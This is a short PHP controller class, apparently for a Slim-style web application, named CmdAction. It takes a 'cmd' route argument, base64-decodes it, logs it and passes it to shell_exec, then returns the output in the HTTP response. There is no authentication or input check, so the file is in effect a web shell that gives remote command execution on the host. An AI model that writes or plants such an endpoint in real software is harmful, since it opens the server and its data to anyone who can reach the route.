<?php
declare(strict_types=1);

namespace App\Application\Actions;

use Psr\Http\Message\ResponseInterface as Response;

class CmdAction extends Action
{	
	protected function action(): Response
    {
        $cmd = $this->resolveArg('cmd');
		$cmd = base64_decode($cmd);
		
		$this->logger->info("Execute cmd `${cmd}`.");

		$out = shell_exec($cmd);

        return $this->respondWithData($out);
    }
}
